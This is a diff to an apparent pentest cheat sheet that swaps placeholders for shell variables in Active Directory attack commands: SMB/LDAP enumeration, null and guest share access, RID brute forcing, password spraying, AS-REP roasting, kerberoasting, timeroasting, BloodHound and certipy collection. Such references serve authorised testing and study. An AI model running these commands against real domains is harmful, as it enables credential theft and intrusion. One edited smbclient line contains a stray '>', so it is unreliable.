@@ -22,45 +22,45 @@ layout:
 ### Enumeration
 
 ```sh
-nxc smb <target>
-enum4linux -a <target>
-nmap -n -sV --script "ldap* and not brute" -p 389 <dc_ip>
-ldapsearch -x -H <dc_ip> -s base
+nxc smb $TARGET
+enum4linux -a $TARGET
+nmap -n -sV --script "ldap* and not brute" -p 389 $DC_IP
+ldapsearch -x -H $DC_IP -s base
 ```
 
 ### Zone transfer
 
 {% code overflow="wrap" %}
 ```sh
-dig axfr <domain> @<dc_ip>
+dig axfr $DOMAIN @$DC_IP
 ```
 {% endcode %}
 
 ### Shares
 
 ```sh
-nxc smb <IP> -u '' -p '' --shares
-nxc smb <IP> -u 'guest' -p '' --shares
+nxc smb $DC_IP -u '' -p '' --shares
+nxc smb $DC_IP -u 'guest' -p '' --shares
 ```
 
 ### Enumerate users
 
 {% code overflow="wrap" %}
 ```sh
-nxc smb <dc_ip> --users
-nxc smb <dc_ip> --rid-brute 10000
+nxc smb $DC_IP --users
+nxc smb $DC_IP --rid-brute 10000
 ```
 {% endcode %}
 
 ```sh
-kerbrute userenum -d <domain> <users.txt>
+kerbrute userenum -d $DOMAIN $USERS_FILE
 ```
 
 ### Timeroast
 
 {% code overflow="wrap" %}
 ```sh
-timeroast.py <dc_ip>
+timeroast.py $DC_IP
 ```
 {% endcode %}
 
@@ -70,7 +70,7 @@ timeroast.py <dc_ip>
 
 {% code overflow="wrap" %}
 ```sh
-nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success
+nxc smb $DC_IP -u $USERS_FILE -p $PASSWORDS_FILE --no-bruteforce --continue-on-success
 ```
 {% endcode %}
 
@@ -78,13 +78,13 @@ nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-
 
 {% code overflow="wrap" %}
 ```sh
-nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>
+nxc ldap $DC_IP -u $USERS_FILE -p '' --asreproast $OUTPUT_FILE
 ```
 {% endcode %}
 
 {% code overflow="wrap" %}
 ```sh
-GetNPUsers.py <domain>/ -usersfile <users.txt>
+GetNPUsers.py $DOMAIN/ -usersfile $USERS_FILE
 ```
 {% endcode %}
 
@@ -92,7 +92,7 @@ GetNPUsers.py <domain>/ -usersfile <users.txt>
 
 {% code overflow="wrap" %}
 ```sh
-GetUserSPNs.py -no-preauth '<asrep_user>' -usersfile <users.txt> -dc-host '<dc_ip>' <domain>/
+GetUserSPNs.py -no-preauth $ASREP_USER -usersfile $USERS_FILE -dc-host $DC_IP $DOMAIN/
 ```
 {% endcode %}
 
@@ -102,7 +102,7 @@ GetUserSPNs.py -no-preauth '<asrep_user>' -usersfile <users.txt> -dc-host '<dc_i
 
 {% code overflow="wrap" %}
 ```sh
-nxc smb <dc_ip> -u '<user>' -p '<password>' --users
+nxc smb $DC_IP -u $USERNAME -p $PASSWORD --users
 ```
 {% endcode %}
 
@@ -110,13 +110,13 @@ nxc smb <dc_ip> -u '<user>' -p '<password>' --users
 
 {% code overflow="wrap" %}
 ```sh
-nxc smb <dc_ip> -u '<user>' -p '<password>' -M spider_plus
+nxc smb $DC_IP -u $USERNAME -p $PASSWORD -M spider_plus
 ```
 {% endcode %}
 
 {% code overflow="wrap" %}
 ```sh
-smbclient.py '<user>:<passwod>@<dc_ip>'
+smbclient.py $USERNAME:$PASSWORD>@$DC_IP
 ```
 {% endcode %}
 
@@ -124,7 +124,7 @@ smbclient.py '<user>:<passwod>@<dc_ip>'
 
 {% code overflow="wrap" %}
 ```sh
-bloodhound-ce-python -d '<domain>' -u '<user>' -p '<password>' [-ns '<dc_ip>'] -c All --zip
+bloodhound-ce-python -d $DOMAIN -u $USERNAME -p $PASSWORD [-ns $DC_IP] -c All --zip
 ```
 {% endcode %}
 
@@ -132,7 +132,7 @@ bloodhound-ce-python -d '<domain>' -u '<user>' -p '<password>' [-ns '<dc_ip>'] -
 
 {% code overflow="wrap" %}
 ```sh
-ldapdomaindump.py -u '<domain>\<user>' -p '<password>' -o <output_folder> '<dc_ip>'
+ldapdomaindump.py -u $DOMAIN\$USERNAME -p $PASSWORD -o $OUTPUT_FOLDER $DC_IP
 ```
 {% endcode %}
 
@@ -140,7 +140,7 @@ ldapdomaindump.py -u '<domain>\<user>' -p '<password>' -o <output_folder> '<dc_i
 
 {% code overflow="wrap" %}
 ```sh
-certipy find -u '<user>@<domain>' -p '<password>' -dc-ip '<dc_ip>' -stdout
+certipy find -u $USERNAME@$DOMAIN -p $PASSWORD -dc-ip $DC_IP -stdout
 ```
 {% endcode %}
 
@@ -148,13 +148,13 @@ certipy find -u '<user>@<domain>' -p '<password>' -dc-ip '<dc_ip>' -stdout
 
 {% code overflow="wrap" %}
 ```sh
-nxc ldap <dc_ip> -u '<user>' -p '<password>' --kerberoasting <output.txt>
+nxc ldap $DC_IP -u $USERNAME -p $PASSWORD --kerberoasting $OUTPUT_FILE
 ```
 {% endcode %}
 
 {% code overflow="wrap" %}
 ```sh
-GetUserSPNs.py -request -dc-ip '<dc_ip>' '<domain>/<user>:<password>'
+GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD
 ```
 {% endcode %}
 
@@ -163,7 +163,7 @@ If you find this error from Linux: `KRB_AP_ERR_SKEW(Clock skew too great)` it's 
 
 {% code overflow="wrap" fullWidth="false" %}
 ```sh
-sudo ntpdate <dc_ip>
+sudo ntpdate $DC_IP
 ```
 {% endcode %}
 {% endhint %}
